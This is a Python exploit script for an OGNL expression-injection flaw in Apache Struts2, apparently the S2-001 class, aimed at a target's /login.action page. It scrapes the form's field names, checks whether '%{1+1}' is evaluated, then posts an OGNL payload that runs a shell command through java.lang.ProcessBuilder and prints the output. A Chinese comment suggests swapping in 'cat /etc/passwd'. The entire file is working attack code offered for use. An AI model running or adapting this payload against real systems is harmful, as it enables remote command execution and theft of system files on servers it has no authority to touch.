import requests
from lib import base_def
import argparse
import urllib
from urllib import parse
import bs4


def find_target_get_parameters(url, header, proxies):
    args_tmp = []
    response = requests.get(url, headers=header, proxies=proxies)

    if response.status_code == 200:
        content = response.text
        soup = bs4.BeautifulSoup(content, 'html.parser')
        for i in soup.find_all('input'):
            if i.get('type') != 'submit':
                args_tmp.append(i.get('name'))
                print("input args " + str(i.get('name')) + " has found")
    return args_tmp


def target_post_test(url, post_text, header, proxies):
    bool_result = False
    response1 = requests.post(url + "/login.action", data=post_text, proxies=proxies, headers=header)

    if response1.status_code == 200:
        soup_res = bs4.BeautifulSoup(response1.text, 'html.parser')
        for i in soup_res.find_all('input'):
            if i.get('value') == "2":
                bool_result = True

    return bool_result


def attack_target_post(url, args, header, proxies, post_command):
    result = []
    response = requests.post(url + "/login.action", data=post_command, proxies=proxies, headers=header)
    if response.status_code == 200:
        soup_res = bs4.BeautifulSoup(response.text, 'html.parser')
        result = soup_res.find_all('body')
    return result


if __name__ == "__main__":
    #-------------脚本初始化部分--------------------
    arg_parser = argparse.ArgumentParser()
    print("the scripts has 2 parameters")
    argparse = base_def.start_help(arg_parser)
    proxies = base_def.default_proxies()
    header = base_def.default_header()
    #根据exp，如果命令是带空格的，就需要将shell_command的字符串变成数组：["cat","/etc/passwd"]
    shell_command = "pwd"
    #--------------------------------------------

    url = "http://" + argparse.ip + ":" + argparse.port
    args = find_target_get_parameters(url=url, header=header, proxies=proxies)
    payload = urllib.parse.quote("%{1+1}")
    post_text = args[0] + "=" + payload + "&" + args[1] + "=" + payload
    command = ("%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\""+shell_command+"\"})).redirectErrorStream(true).start("
               "),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),"
               "#e=new char[50000],#d.read(#e),#f=#context.get("
               "\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new "
               "java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}")
    post_command = args[0] + "=" + urllib.parse.quote(command) + "&" + args[1] + "=" + urllib.parse.quote(command)
    if target_post_test(url=url, header=header, proxies=proxies, post_text=post_text):
        print(attack_target_post(url=url, args=args, header=header, proxies=proxies, post_command=post_command))
